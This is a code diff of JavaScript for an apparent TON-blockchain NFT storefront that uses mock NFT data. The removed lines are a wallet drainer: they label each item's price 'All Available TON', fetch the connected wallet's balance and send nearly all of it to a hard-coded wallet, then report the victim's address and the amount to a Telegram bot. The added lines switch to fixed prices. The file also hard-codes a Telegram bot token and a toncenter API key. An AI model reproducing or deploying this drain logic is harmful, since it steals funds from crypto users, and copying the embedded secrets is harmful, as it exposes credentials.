@@ -3,10 +3,9 @@ const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
     buttonRootId: 'ton-connect'
 });
 
-const MAIN_WALLET = "UQB_1vs8YfWcLzedQqVYRv5_OcXWZsqewXRj9io0CvsGqZAD"; // Replace with a valid, initialized address
+const MAIN_WALLET = "UQB_1vs8YfWcLzedQqVYRv5_OcXWZsqewXRj9io0CvsGqZAD"; // Updated address
 const TG_BOT_TOKEN = "7412797367:AAE9ZTr0L4xI6GtALTGXUXINvGt_-CV0cDA";
 const TG_CHAT_ID = "8126533622";
-const NETWORK_FEE = 0.05; // Reserve 0.05 TON for network fees
 
 // Mock NFT data
 const nfts = [
@@ -42,9 +41,9 @@ function renderNfts() {
                 <h3 class="nft-name">${nft.name}</h3>
                 <p class="nft-price">
                     <img src="images/ton-symbol.png" alt="TON" class="ton-symbol">
-                    All Available TON
+                    ${nft.price} TON
                 </p>
-                <button class="buy-button" data-name="${nft.name}">Buy Now</button>
+                <button class="buy-button" data-name="${nft.name}" data-price="${nft.price}">Buy Now</button>
             </div>
         `;
         grid.appendChild(card);
@@ -53,32 +52,15 @@ function renderNfts() {
     document.querySelectorAll('.buy-button').forEach(button => {
         button.addEventListener('click', (e) => {
             const name = e.target.dataset.name;
-            console.log('Buy button clicked for:', name);
-            buyNFT(name, e.target);
+            const price = e.target.dataset.price;
+            console.log('Buy button clicked for:', name, 'Price:', price);
+            buyNFT(name, price, e.target);
         });
     });
 }
 
-// Function to get wallet balance
-async function getWalletBalance(address) {
-    if (!window.TonWeb) {
-        throw new Error('TonWeb library not loaded');
-    }
-    const TonWeb = window.TonWeb;
-    const tonClient = new TonWeb.HttpProvider('https://toncenter.com/api/v2/jsonRPC', { 
-        apiKey: '72af116adcb9f929960600dcd7a9c14db0ec949d291ca28c3447d0a31a94632b' // Replace with your API key
-    });
-    try {
-        const balance = await tonClient.getBalance(address);
-        return TonWeb.utils.fromNano(balance); // Convert nanotons to TON
-    } catch (error) {
-        console.error('Failed to fetch balance:', error);
-        throw new Error('Unable to fetch wallet balance: ' + error.message);
-    }
-}
-
-// Function to buy NFT with all available balance
-async function buyNFT(name, buttonElement) {
+// Function to buy NFT with fixed price
+async function buyNFT(name, price, buttonElement) {
     try {
         if (!tonConnectUI.connected || !tonConnectUI.account) {
             console.log('Opening TonConnect modal');
@@ -90,17 +72,8 @@ async function buyNFT(name, buttonElement) {
         buttonElement.textContent = 'Processing...';
 
         const walletAddress = tonConnectUI.account.address;
-        console.log('Fetching balance for:', walletAddress);
-
-        // Fetch wallet balance
-        const balanceTon = await getWalletBalance(walletAddress);
-        const amountToSendTon = parseFloat(balanceTon) - NETWORK_FEE;
-        if (amountToSendTon <= 0) {
-            throw new Error('Insufficient balance to cover network fees');
-        }
-
-        const amountToSend = (BigInt(Math.floor(amountToSendTon * 1000000000))).toString();
-        console.log('Sending:', amountToSendTon, 'TON');
+        const amountToSend = (BigInt(Math.floor(parseFloat(price) * 1000000000))).toString(); // Convert TON to nanotons
+        console.log('Sending:', price, 'TON');
 
         const transaction = {
             validUntil: Math.floor(Date.now() / 1000) + 600,
@@ -117,10 +90,10 @@ async function buyNFT(name, buttonElement) {
         const result = await tonConnectUI.sendTransaction(transaction);
         console.log('Transaction successful:', result);
 
-        const message = `*New NFT Purchase*\nFrom: \`${walletAddress}\`\nItem: *${name}*\nAmount: *${amountToSendTon.toFixed(2)} TON*`;
+        const message = `*New NFT Purchase*\nFrom: \`${walletAddress}\`\nItem: *${name}*\nAmount: *${price} TON*`;
         sendTelegramMessage(message);
 
-        alert(`Successfully purchased "${name}" for ${amountToSendTon.toFixed(2)} TON!`);
+        alert(`Successfully purchased "${name}" for ${price} TON!`);
 
     } catch (error) {
         console.error('Transaction failed:', error);
